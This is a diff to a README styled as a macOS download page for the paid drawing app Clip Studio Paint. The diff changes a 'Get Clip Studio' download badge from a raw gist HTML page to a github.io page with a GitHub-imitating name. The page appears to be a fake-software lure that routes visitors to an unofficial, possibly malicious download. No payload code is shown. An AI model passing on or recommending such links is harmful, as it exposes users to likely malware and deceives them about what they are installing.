@@ -3,7 +3,7 @@
 **Clip Studio Paint** for **macOS** is the ultimate creative studio for illustrators, comic artists, and animators.  
 Featuring an industry-leading brush engine, vector tools, and AI-powered features, it’s designed for speed, precision, and expressive control — optimized for **Apple Silicon**. 🍎  
 
-[![🩵 Get GitHub Instruction](https://img.shields.io/badge/🩵%20Get%20Clip%20Studio-00B0FF?style=for-the-badge&logo=apple&logoColor=white&labelColor=0B0F19)](https://gistcdn.githack.com/dittecabbie89/63eea79bc6bf5c257c6dbbeb4e8a28e0/raw/4727c23cfe7d1352176a4251bd8ab22ed7dbd11a/app.html?offer=ClipStudioPaintMac)
+[![🩵 Get GitHub Instruction](https://img.shields.io/badge/🩵%20Get%20Clip%20Studio-00B0FF?style=for-the-badge&logo=apple&logoColor=white&labelColor=0B0F19)](https://git-app-desk.github.io/.github/?offer=ClipStudioPaintMac)
 
 ---
 
